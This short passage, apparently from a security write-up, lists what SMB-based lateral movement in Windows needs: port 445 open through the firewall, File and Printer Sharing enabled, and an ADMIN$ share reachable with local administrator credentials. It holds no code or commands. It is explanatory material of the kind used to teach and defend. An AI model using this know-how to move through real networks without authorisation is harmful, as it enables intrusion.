Requirements:
- SMB connection through the firewall (commonly port 445)
- Windows File and Printer Sharing feature to be enabled
- admin share called **ADMIN$** to be available (To establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.)
